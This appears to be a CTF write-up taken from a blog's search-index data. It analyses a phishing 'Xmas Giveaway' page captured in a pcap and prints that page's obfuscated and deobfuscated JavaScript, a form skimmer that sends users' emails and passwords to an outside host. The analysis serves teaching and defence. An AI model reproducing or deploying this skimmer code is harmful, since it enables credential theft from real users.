_0x37a3bb=_0xaf724a(0x8d);function _0x2ae5a0(_0x49225f){var _0x4a91e4=_0xaf724a,_0x1d14ff=[\u0026#39;s\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;a\u0026#39;],_0x1bcfcc=[];input=atob(_0x49225f);for(var _0x4d4b2f=0x0;_0x4d4b2f\u0026lt;input[_0x4a91e4(0x88)];_0x4d4b2f++){var _0x41b22f=input[_0x4a91e4(0x80)](_0x4d4b2f)^_0x1d14ff[_0x4d4b2f%_0x1d14ff[_0x4a91e4(0x88)]][_0x4a91e4(0x80)](0x0);_0x1bcfcc[_0x4a91e4(0x96)](String[\u0026#39;fromCharCode\u0026#39;](_0x41b22f));}return _0x1bcfcc[_0x4a91e4(0x98)](\u0026#39;\u0026#39;);}function _0xe05049(){var _0x3ebbc9=_0xaf724a,_0x45261b=_0x3a9d03,_0x2bf34e=_0x38e031,_0x5ba78a=_0x2ae5a0(_0x37a3bb),_0x5b4edc=new XMLHttpRequest();_0x5b4edc[_0x3ebbc9(0x99)](_0x3ebbc9(0x8f),_0x3ebbc9(0x85)+_0x45261b+\u0026#39;\u0026amp;password=\u0026#39;+_0x2bf34e+_0x3ebbc9(0x84)+String(_0x5ba78a)),_0x5b4edc[_0x3ebbc9(0x86)]();}_0xe05049();});})); \u0026lt;/script\u0026gt; This request contains the index.html page of the themrbeas7.org website.\nWe can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as password, fromCharCode, h[x][x]ps://storage.appssec.co.ind? and so on.\nThis is basically obfuscated javascript. Let\u0026rsquo;s try to deobfuscate it and make sense of it.\nFor this purpose, we can use the online tool:\nhttps://deobfuscate.relative.im/ We can pass the obfuscated javascript to it and click on \u0026lsquo;deobfuscate\u0026rsquo;. Doing this, we get the following code:\ndocument.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function () { const _0x4c17d1 = document.querySelector(\u0026#39;.subscribe-form .btn.btn-info\u0026#39;), _0x5bc16f = document.querySelector( \u0026#39;.subscribe-form .form-control[type=\u0026#34;text\u0026#34;]\u0026#39; ), _0x106e8a = document.querySelector( \u0026#39;.subscribe-form .form-control[type=\u0026#34;password\u0026#34;]\u0026#39; ) _0x4c17d1.addEventListener(\u0026#39;click\u0026#39;, function () { const _0x3a9d03 = _0x5bc16f.value, _0x38e031 = _0x106e8a.value var _0x37a3bb = \u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39; function _0x2ae5a0(_0x49225f) { var _0x1d14ff = [\u0026#39;s\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;a\u0026#39;], _0x1bcfcc = [] input = atob(_0x49225f) for (var _0x4d4b2f = 0; _0x4d4b2f \u0026lt; input.length; _0x4d4b2f++) { var _0x41b22f = input.charCodeAt(_0x4d4b2f) ^ _0x1d14ff[_0x4d4b2f % _0x1d14ff.length].charCodeAt(0) _0x1bcfcc.push(String.fromCharCode(_0x41b22f)) } return _0x1bcfcc.join(\u0026#39;\u0026#39;) } function _0xe05049() { var _0x45261b = _0x3a9d03, _0x2bf34e = _0x38e031, _0x5ba78a = _0x2ae5a0(_0x37a3bb), _0x5b4edc = new XMLHttpRequest() _0x5b4edc.open( \u0026#39;GET\u0026#39;, \u0026#39;https://storage.appssec.co.ind?email=\u0026#39; + _0x45261b + \u0026#39;\u0026amp;password=\u0026#39; + _0x2bf34e + \u0026#39;\u0026amp;apikey=\u0026#39; + String(_0x5ba78a) ) _0x5b4edc.send() } _0xe05049() }) }) This script still looks obfuscated but we can agree that it looks much better than before. It basically adds a Listener on the subscribe form button. Listeners in javascript are basically actions that wait to be happened. Here, once the subscribe-form button has been clicked, the script we deobfuscated will run. But what does it actually do?\nWell, we see that it gets a username and a password from the form that had its button clicked. Then, it makes a request to the website h[x][x]ps://storage.appssec.co.ind with url arguments:\nusername password apikey The interesting part here is how the apikey is found. We notice a base64 encoded string that is decoded, xored with the key santa and then passed to the url where the request will be made.\nFollowing up with the actions of the script, if we decode the base64 string and xor it with the key, we will get the apikey which is also the flag for this challenge:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; apikey_encrypted = b\u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39; \u0026gt;\u0026gt;\u0026gt; apikey_encr = b64decode(apikey_encrypted.decode()) \u0026gt;\u0026gt;\u0026gt; key_for_decryption = b\u0026#39;santa\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; xor(apikey_encr, key_for_decryption) b\u0026#39;NHACK{M2.B3457_51735_423_3v32ywh323_n0w4d4y5}\u0026#39; \u0026gt;\u0026gt;\u0026gt; Bonus ways to solve it:\nAdd the following line in the javascript function _0xe05049() of the website: alert(_0x5ba78a); and then visit the website and click on the Subscribe button. This will decrypt the apikey for you and print it on the screen in an alert box. This is happening since the _0x5ba78a is the decrypted apikey returned from the function _0x37a3bb. Open Wireshark, run a fakedns server and click on the subscribe button without modifying javascript this time. What will happen is a DNS query to storage.appssec.co.ind will be successful and thus, a request with the username, password and decrypted api key will be made to this host which will be visible in Wireshark. Overall, the website tried to act as a legitimate site, gathering credentials from users and sending them to a possible VPS server. These could later be tried as reused credentials for other websites as this is very common amongst users.\nThis is it for this challenge.\n","permalink":"http://localhost:1313/ctfwriteups/xmasgiveaway/","summary":"\u003ch2 id=\"starting-the-analysis\"\u003eStarting the analysis\u003c/h2\u003e\n\u003cp\u003eA pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.\u003c/p\u003e\n\u003cp\u003eOpening the file with Wireshark, we can view all the requests.\u003cbr\u003e\nThe request that is of interest is the one made to \u003cem\u003ethemrbeas7.org\u003c/em\u003e and is the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGET /christmasGiveaway/index.html HTTP/1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost: themrbeas7.org\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccept-Language: en-US,en;q=0.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccept-Encoding: gzip, deflate, br\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eConnection: keep-alive\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUpgrade-Insecure-Requests: 1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSec-Fetch-Dest: document\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSec-Fetch-Mode: navigate\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSec-Fetch-Site: none\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSec-Fetch-User: ?1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHTTP/1.0 200 OK\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eServer: Apache/2.4.43 (FreeBSD)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDate: Mon, 04 Dec 2023 10:09:52 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eContent-type: text/html\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eContent-Length: 10649\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLast-Modified: Sun, 03 Dec 2023 17:25:38 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;\u003cspan style=\"color:#f92672\"\u003ehtml\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ehead\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003emeta\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echarset\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;UTF-8\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003emeta\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehttp-equiv\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;X-UA-Compatible\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtent\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;IE=edge\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t    \u0026lt;\u003cspan style=\"color:#f92672\"\u003emeta\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;viewport\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtent\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;width=device-width, initial-scale=1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003elink\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortcut icon\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;img/Favicon.png\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;image/x-icon\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003etitle\u003c/span\u003e\u0026gt;Xmas Giveaway\u0026lt;/\u003cspan style=\"color:#f92672\"\u003etitle\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/javascript\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;js/jquery.js\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/javascript\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;js/bootstrap.min.js\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/javascript\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;js/timer.js\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/javascript\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;js/script.js\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003elink\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;stylesheet\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/css\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;css/bootstrap.css\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003elink\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;stylesheet\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/css\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;css/bootstrap.min.css\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003elink\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;stylesheet\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/css\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;css/font-awesome.min.css\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003elink\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;http://fonts.googleapis.com/css?family=Lobster\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;stylesheet\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;text/css\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003elink\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;stylesheet\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text/css\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;css/custom.css\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ehead\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ebody\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eonload\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;countdown(year,month,day,hour,minute)\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- Carousel --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;myCarousel\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel slide\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-ride\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- Indicators --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \u0026lt;\u003cspan style=\"color:#f92672\"\u003eol\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel-indicators\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-target\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;#myCarousel\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-slide-to\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;active\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-target\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;#myCarousel\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-slide-to\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-target\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;#myCarousel\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-slide-to\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \u0026lt;/\u003cspan style=\"color:#f92672\"\u003eol\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel-inner\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;container timer\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;home\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;logo text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan style=\"color:#f92672\"\u003efont\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecolor\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;red\u0026#34;\u003c/span\u003e\u0026gt;Christmas is almost here\u0026lt;/\u003cspan style=\"color:#f92672\"\u003efont\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t   \t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row timer-circle\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\t\u0026lt;\u003cspan 